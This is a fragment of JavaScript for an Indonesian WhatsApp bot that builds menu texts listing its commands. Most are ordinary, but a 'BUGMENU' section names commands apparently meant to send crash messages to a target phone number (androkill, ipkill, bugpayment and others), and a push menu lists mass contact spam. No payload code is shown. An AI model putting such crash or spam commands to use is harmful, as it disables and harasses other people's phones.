  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚒𝚗𝚍𝚘
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚓𝚎𝚙𝚊𝚗
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚖𝚊𝚕𝚊𝚢𝚜𝚒𝚊 
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚑𝚒𝚓𝚊𝚋𝚎𝚛 
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚌𝚑𝚒𝚗𝚊
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚟𝚒𝚎𝚝𝚗𝚊𝚖
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚔𝚘𝚛𝚎𝚊
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'allmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-          ⎘ ⌈𝐀𝐃𝐃𝐌𝐄𝐍𝐔 ⎘         

📄 ${prefix}𝚊𝚍𝚍𝚙𝚛𝚎𝚖 *𝟼𝟸𝟾𝟾𝟿𝟿/@𝚝𝚊𝚐*
📄 ${prefix}𝚍𝚎𝚕𝚙𝚛𝚎𝚖 *𝟼𝟸𝟾𝟾𝟾𝟿/@𝚝𝚊𝚐*
📄 ${prefix}𝚌𝚎𝚔𝚙𝚛𝚎𝚖
📄 ${prefix}𝚕𝚒𝚜𝚝𝚙𝚛𝚎𝚖

▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-          ⎘ ⌈𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚓𝚘𝚒𝚗
📄 ${prefix}𝚕𝚎𝚊𝚟𝚎
📄 ${prefix}𝚙𝚎𝚜𝚊𝚗𝚜𝚎𝚖𝚎𝚗𝚝𝚊𝚛𝚊
📄 ${prefix}𝚛𝚎𝚜𝚎𝚝𝚕𝚒𝚗𝚔𝚐𝚌
📄 ${prefix}𝚎𝚍𝚒𝚝𝚜𝚞𝚋𝚓𝚎𝚔 
📄 ${prefix}𝚎𝚍𝚒𝚝𝚍𝚎𝚜𝚔 
📄 ${prefix}𝚎𝚍𝚒𝚝𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚛𝚞𝚕𝚎𝚜
📄 ${prefix}𝚛𝚞𝚕𝚎𝚜𝚋𝚘𝚝
📄 ${prefix}𝚊𝚍𝚍
📄 ${prefix}𝚔𝚒𝚌𝚔
📄 ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚜𝚎𝚗𝚍𝚕𝚒𝚗𝚔𝚐𝚌
📄 ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎
📄 ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎
📄 ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐
📄 ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕
📄 ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘
📄 ${prefix}𝚝𝚘𝚝𝚊𝚐

-          ⎘ ⌈𝐒𝐓𝐎𝐑𝐄𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚍𝚘𝚗𝚎
📄 ${prefix}𝚋𝚊𝚝𝚊𝚕
📄 ${prefix}𝚙𝚛𝚘𝚜𝚎𝚜
📄 ${prefix}𝚝𝚞𝚗𝚍𝚊
📄 ${prefix}𝚜𝚘𝚜𝚖𝚎𝚍

-          ⎘ ⌈𝐒𝐄𝐀𝐑𝐂𝐇𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚊𝚒
📄 ${prefix}𝚊𝚒𝚒𝚖𝚊𝚐𝚎
📄 ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝
📄 ${prefix}𝚝𝚛𝚊𝚗𝚜𝚕𝚊𝚝𝚎
📄 ${prefix}𝚜𝚜
📄 ${prefix}𝚜𝚑𝚘𝚛𝚝𝚕𝚒𝚗𝚔
📄 ${prefix}𝚋𝚛𝚊𝚒𝚗𝚕𝚢
📄 ${prefix}𝚛𝚘𝚋𝚘𝚐𝚞𝚛𝚞
📄 ${prefix}𝚠𝚒𝚔𝚒𝚙𝚎𝚍𝚒𝚊
📄 ${prefix}𝚓𝚊𝚛𝚊𝚔
📄 ${prefix}𝚔𝚘𝚍𝚎𝚙𝚘𝚜
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚘𝚕𝚊

-          ⎘ ⌈𝐂𝐔𝐂𝐈𝐌𝐀𝐓𝐀⌋ ⎘         

📄 ${prefix}𝚌𝚎𝚌𝚊𝚗
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚒𝚗𝚍𝚘
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚓𝚎𝚙𝚊𝚗
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚖𝚊𝚕𝚊𝚢𝚜𝚒𝚊 
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚑𝚒𝚓𝚊𝚋𝚎𝚛 
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚌𝚑𝚒𝚗𝚊
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚟𝚒𝚎𝚝𝚗𝚊𝚖
📄 ${prefix}𝚌𝚎𝚌𝚊𝚗𝚔𝚘𝚛𝚎𝚊

-          ⎘ ⌈𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚗𝚘𝚠𝚊
📄 ${prefix}𝚎𝚗𝚌
📄 ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
📄 ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
📄 ${prefix}𝚜𝚑𝚞𝚝𝚍𝚘𝚠𝚗
📄 ${prefix}𝚋𝚕𝚘𝚌𝚔𝚒𝚛
📄 ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔𝚒𝚛
📄 ${prefix}𝙳𝙴𝙻𝙴𝚃𝙴
📄 ${prefix}𝙻𝙸𝚂𝚃𝙿𝙲
📄 ${prefix}𝚀𝚄𝙾𝚃𝙴𝙳
📄 ${prefix}𝚔𝚞𝚍𝚎𝚝𝚊
📄 ${prefix}𝚌𝚛𝚎𝚍𝚒𝚝𝚜
📄 ${prefix}𝚐𝚎𝚝𝚒𝚍𝚐𝚌
📄 ${prefix}𝚐𝚎𝚝𝚌𝚊𝚜𝚎
📄 ${prefix}𝚌𝚛𝚎𝚊𝚝𝚎𝚐𝚌
📄 ${prefix}𝚜𝚎𝚝𝚋𝚘𝚝𝚗𝚊𝚖𝚎
📄 ${prefix}𝚜𝚎𝚝𝚋𝚘𝚝𝚋𝚒𝚘
📄 ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚍𝚎𝚕𝚙𝚙𝚐𝚌

-          ⎘ ⌈𝐁𝐄𝐑𝐈𝐓𝐀𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚌𝚗𝚗
📄 ${prefix}𝚌𝚗𝚋𝚌
📄 ${prefix}𝚕𝚊𝚢𝚊𝚛𝚔𝚊𝚌𝚊
📄 ${prefix}𝚍𝚊𝚒𝚕𝚢
📄 ${prefix}𝚝𝚛𝚒𝚋𝚞𝚗
📄 ${prefix}𝚒𝚗𝚍𝚘𝚣𝚘𝚗𝚎
📄 ${prefix}𝚜𝚒𝚗𝚍𝚘
📄 ${prefix}𝚝𝚎𝚖𝚙𝚘
📄 ${prefix}𝚊𝚗𝚝𝚊𝚛𝚊
📄 ${prefix}𝚔𝚘𝚗𝚝𝚊𝚗
📄 ${prefix}𝚖𝚎𝚛𝚍𝚎𝚔𝚊
📄 ${prefix}𝚔𝚘𝚖𝚙𝚊𝚜
📄 ${prefix}𝚍𝚎𝚝𝚒𝚔
📄 ${prefix}𝚘𝚔𝚎𝚣𝚘𝚗𝚎
📄 ${prefix}𝚒𝚗𝚎𝚠𝚜
📄 ${prefix}𝚓𝚊𝚕𝚊𝚗𝚝𝚒𝚔𝚞𝚜
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚝𝚟
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚝𝚟𝚗𝚘𝚠
📄 ${prefix}𝚒𝚗𝚏𝚘𝚐𝚎𝚖𝚙𝚊
📄 ${prefix}𝚌𝚞𝚊𝚌𝚊

-          ⎘ ⌈𝐑𝐀𝐍𝐃𝐎𝐌𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
📄 ${prefix}𝚊𝚝𝚝𝚙
📄 ${prefix}𝚠𝚖
📄 ${prefix}𝚚𝚌
📄 ${prefix}𝚜𝚖𝚎𝚖𝚎
📄 ${prefix}𝚔𝚊𝚕𝚔𝚞𝚕𝚊𝚝𝚘𝚛
📄 ${prefix}𝚜𝚝𝚊𝚕𝚔𝚝𝚒𝚔𝚝𝚘𝚔 
📄 ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜
📄 ${prefix}𝚏𝚊𝚔𝚝𝚊𝚞𝚗𝚒𝚔
📄 ${prefix}𝚔𝚊𝚝𝚊𝚋𝚒𝚓𝚊𝚔
📄 ${prefix}𝚙𝚊𝚗𝚝𝚞𝚗
📄 ${prefix}𝚋𝚞𝚌𝚒𝚗
📄 ${prefix}𝚌𝚎𝚛𝚙𝚎𝚗


   ('Random Images')
📄 ${prefix}𝚊𝚛𝚝
📄 ${prefix}𝚊𝚠𝚘𝚘
📄 ${prefix}𝚋𝚝𝚜
📄 ${prefix}𝚌𝚘𝚐𝚊𝚗
📄 ${prefix}𝚎𝚕𝚊𝚒𝚗𝚊
📄 ${prefix}𝚎𝚡𝚘
📄 ${prefix}𝚗𝚎𝚔𝚘
📄 ${prefix}𝚎𝚕𝚏
📄 ${prefix}𝚎𝚜𝚝𝚎𝚝𝚒𝚌
📄 ${prefix}𝚔𝚊𝚗𝚗𝚊
📄 ${prefix}𝚕𝚘𝚕𝚒
📄 ${prefix}𝚜𝚑𝚘𝚝𝚊
📄 ${prefix}𝚑𝚞𝚜𝚋𝚞
📄 ${prefix}𝚠𝚊𝚒𝚏𝚞
📄 ${prefix}𝚜𝚊𝚐𝚒𝚛𝚒
📄 ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
📄 ${prefix}𝚖𝚎𝚐𝚞𝚖𝚒𝚗
📄 ${prefix}𝚠𝚊𝚕𝚕𝚗𝚒𝚖𝚎
📄 ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚒𝚖𝚊𝚐𝚎
📄 ${prefix}𝚔𝚒𝚕𝚕
📄 ${prefix}𝚙𝚊𝚝
📄 ${prefix}𝚕𝚒𝚌𝚔
📄 ${prefix}𝚋𝚒𝚝𝚎
📄 ${prefix}𝚢𝚎𝚎𝚝
📄 ${prefix}𝚋𝚘𝚗𝚔
📄 ${prefix}𝚠𝚒𝚗𝚔
📄 ${prefix}𝚙𝚘𝚔𝚎
📄 ${prefix}𝚗𝚘𝚖
📄 ${prefix}𝚜𝚕𝚊𝚙
📄 ${prefix}𝚜𝚖𝚒𝚕𝚎
📄 ${prefix}𝚠𝚊𝚟𝚎
📄 ${prefix}𝚋𝚕𝚞𝚜𝚑
📄 ${prefix}𝚜𝚖𝚞𝚐
📄 ${prefix}𝚐𝚕𝚘𝚖𝚙
📄 ${prefix}𝚑𝚊𝚙𝚙𝚢
📄 ${prefix}𝚍𝚊𝚗𝚌𝚎
📄 ${prefix}𝚌𝚛𝚒𝚗𝚐𝚎
📄 ${prefix}𝚑𝚒𝚐𝚑𝚏𝚒𝚟𝚎
📄 ${prefix}𝚑𝚊𝚗𝚍𝚑𝚘𝚕𝚍


   ('Text Pro')
📄 ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
📄 ${prefix}𝚗𝚎𝚘𝚗
📄 ${prefix}𝚐𝚛𝚎𝚎𝚗𝚗𝚎𝚘𝚗
📄 ${prefix}𝚊𝚍𝚟𝚊𝚗𝚌𝚎𝚐𝚕𝚘𝚠
📄 ${prefix}𝚏𝚞𝚝𝚞𝚛𝚎𝚗𝚎𝚘𝚗
📄 ${prefix}𝚜𝚊𝚗𝚍𝚠𝚛𝚒𝚝𝚒𝚗𝚐
📄 ${prefix}𝚜𝚊𝚗𝚍𝚜𝚞𝚖𝚖𝚎𝚛
📄 ${prefix}𝚜𝚊𝚗𝚍𝚎𝚗𝚐𝚛𝚊𝚟𝚎𝚍
📄 ${prefix}𝚖𝚎𝚝𝚊𝚕𝚍𝚊𝚛𝚔
📄 ${prefix}𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
📄 ${prefix}𝚑𝚘𝚕𝚘𝚐𝚛𝚊𝚙𝚑𝚒𝚌
📄 ${prefix}𝚝𝚎𝚡𝚝𝟷𝟿𝟷𝟽
📄 ${prefix}𝚖𝚒𝚗𝚒𝚘𝚗
📄 ${prefix}𝚍𝚎𝚕𝚞𝚡𝚎𝚜𝚒𝚟𝚎𝚛
📄 ${prefix}𝚗𝚎𝚠𝚢𝚎𝚊𝚛𝚌𝚊𝚛𝚍
📄 ${prefix}𝚋𝚕𝚘𝚘𝚍𝚏𝚛𝚘𝚜𝚝𝚎𝚍
📄 ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗
📄 ${prefix}𝚓𝚘𝚔𝚎𝚛𝚕𝚘𝚐𝚘
📄 ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
📄 ${prefix}𝚗𝚊𝚝𝚞𝚛𝚎𝚕𝚎𝚊𝚟𝚎𝚜
📄 ${prefix}𝚋𝚘𝚔𝚎𝚑
📄 ${prefix}𝚝𝚘𝚡𝚒𝚌
📄 ${prefix}𝚜𝚝𝚛𝚊𝚠𝚋𝚎𝚛𝚛𝚢 
📄 ${prefix}𝚋𝚘𝚡𝟹𝚍
📄 ${prefix}𝚛𝚘𝚊𝚍𝚠𝚊𝚛𝚗𝚒𝚗𝚐
📄 ${prefix}𝚋𝚛𝚎𝚊𝚔𝚠𝚊𝚕𝚕
📄 ${prefix}𝚒𝚌𝚎𝚌𝚘𝚕𝚍
📄 ${prefix}𝚕𝚞𝚡𝚞𝚛𝚢
📄 ${prefix}𝚌𝚕𝚘𝚞𝚍
📄 ${prefix}𝚜𝚞𝚖𝚖𝚎𝚛𝚜𝚊𝚗𝚍
📄 ${prefix}𝚑𝚘𝚛𝚘𝚛𝚋𝚕𝚘𝚘𝚍
📄 ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛

-          ⎘ ⌈𝐁𝐔𝐆𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚜𝚎𝚗𝚍𝚐𝚊𝚜𝚏𝚞𝚕𝚕 
📄 ${prefix}𝚋𝚞𝚐𝚙𝚊𝚢𝚖𝚎𝚗𝚝
📄 ${prefix}𝚐𝚊𝚜𝚏𝚞𝚕𝚕𝚐𝚌
📄 ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝
📄 ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝𝚐𝚌
📄 ${prefix}𝚍𝚘𝚌𝚞𝚡
📄 ${prefix}𝚌𝚕𝚎𝚊𝚛𝚐𝚌
📄 ${prefix}𝚖𝚊𝚝𝚒𝚐𝚌
📄 ${prefix}𝚍𝚎𝚊𝚍𝚐𝚌
📄 ${prefix}𝚋𝚊𝚗𝚝𝚊𝚒𝚐𝚌
📄 ${prefix}𝚞𝚗𝚕𝚒𝚙𝚎𝚗𝚍𝚒𝚗𝚐
📄 ${prefix}𝚞𝚗𝚕𝚒𝚊𝚝𝚝𝚎𝚗𝚝𝚒𝚘𝚗
📄 ${prefix}𝚞𝚗𝚕𝚒𝚗𝚎𝚐𝚛𝚘
📄 ${prefix}𝚞𝚗𝚕𝚒𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}𝚡𝚊𝚗𝚍𝚛𝚘
📄 ${prefix}𝚡𝚜𝚒𝚜𝚝𝚎𝚖
📄 ${prefix}𝚡𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}++𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}𝚂𝙲𝙷𝙴𝙳𝚄𝙻𝙴𝙾𝙱𝙹𝙴𝙲𝚃 
📄 ${prefix}𝚊𝚗𝚍𝚛𝚘𝚔𝚒𝚕𝚕
📄 ${prefix}𝚒𝚙𝚔𝚒𝚕𝚕,
📄 ${prefix}👺 (628xxxx)
📄 ${prefix}🐵 (628xxxx)
📄 ${prefix}🌷 (628xxxx)
📄 ${prefix}🐲 (628xxxx)
📄 ${prefix}🐉 (628xxxx)
📄 ${prefix}🌵 (628xxxx)
📄 ${prefix}🎄 (628xxxx)
📄 ${prefix}🌲 (628xxxx)
📄 ${prefix}🌳 (628xxxx)
📄 ${prefix}🌴 (628xxxx)
📄 ${prefix}🌱 (628xxxx)
📄 ${prefix}🌿 (628xxxx)
📄 ${prefix}☘️ (628xxxx)
📄 ${prefix}🍀 (628xxxx)

-          ⎘ ⌈𝐈𝐒𝐋𝐀𝐌𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}${prefix}𝚕𝚒𝚜𝚝𝚜𝚞𝚛𝚊𝚑
📄 ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
📄 ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗𝚊𝚞𝚍𝚒𝚘
📄 ${prefix}𝚊𝚜𝚖𝚊𝚞𝚕𝚑𝚞𝚜𝚗𝚊 
📄 ${prefix}𝚔𝚒𝚜𝚊𝚑𝚗𝚊𝚋𝚒
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚜𝚑𝚘𝚕𝚊𝚝 

-          ⎘⌈𝐏𝐔𝐒𝐇𝐌𝐄𝐍𝐔⌋⎘         

📄 ${prefix}𝚙𝚞𝚜𝚑𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚙𝚞𝚜𝚑𝚔𝚘𝚗𝚝𝚊𝚔𝟸
📄 ${prefix}𝚓𝚙𝚖
📄 ${prefix}𝚓𝚙𝚖𝟸
📄 ${prefix}𝚐𝚎𝚝𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚊𝚟𝚎𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚎𝚗𝚍𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚎𝚗𝚍𝚔𝚘𝚗𝚝𝚊𝚐

-          ⎘⌈𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔⌋⎘         

📄 ${prefix}𝚙𝚕𝚊𝚢
📄 ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎
📄 ${prefix}𝚑𝚍𝚛
📄 ${prefix}𝚛𝚎𝚖𝚒𝚗𝚒
📄 ${prefix}𝚝𝚘𝚞𝚛𝚕
📄 ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
📄 ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚟𝚒𝚍𝚎𝚘
📄 ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙𝟹
📄 ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑
📄 ${prefix}𝚢𝚝𝚖𝚙𝟹
📄 ${prefix}𝚢𝚝𝚖𝚙𝟺
📄 ${prefix}𝚐𝚒𝚝
📄 ${prefix}𝚐𝚑𝚜𝚝𝚊𝚕𝚔

-          ⎘⌈𝐅𝐔𝐍𝐌𝐄𝐍𝐔⌋⎘         

📄 ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
📄 ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
📄 ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
📄 ${prefix}𝚌𝚘𝚌𝚘𝚔𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
📄 ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚙𝚎𝚛𝚗𝚒𝚔𝚊𝚑𝚊𝚗
📄 ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
📄 ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
📄 ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
📄 ${prefix}𝚛𝚊𝚖𝚊𝚕𝚗𝚊𝚜𝚒𝚋
📄 ${prefix}𝚙𝚘𝚝𝚎𝚗𝚜𝚒𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
📄 ${prefix}𝚜𝚊𝚗𝚐𝚎𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚜𝚊𝚗𝚐𝚎
📄 ${prefix}𝚐𝚊𝚢𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚐𝚊𝚢
📄 ${prefix}𝚌𝚎𝚔𝚐𝚊𝚗𝚝𝚎𝚗𝚐
📄 ${prefix}𝚌𝚎𝚔𝚌𝚊𝚗𝚝𝚒𝚔
📄 ${prefix}𝚌𝚎𝚔𝚔𝚊𝚢𝚊
📄 ${prefix}𝚕𝚎𝚜𝚋𝚒𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚕𝚎𝚜𝚋𝚒
📄 ${prefix}𝚊𝚙𝚊𝚔𝚊𝚑
📄 ${prefix}𝚋𝚒𝚜𝚊𝚔𝚊𝚑
📄 ${prefix}𝚋𝚊𝚐𝚊𝚒𝚖𝚊𝚗𝚊𝚔𝚊𝚑
📄 ${prefix}𝚛𝚊𝚝𝚎
📄 ${prefix}𝚠𝚊𝚗𝚐𝚢
📄 ${prefix}𝚌𝚎𝚔𝚖𝚊𝚝𝚒

-          ⎘ ⌈𝐒𝐎𝐔𝐍𝐃𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟶
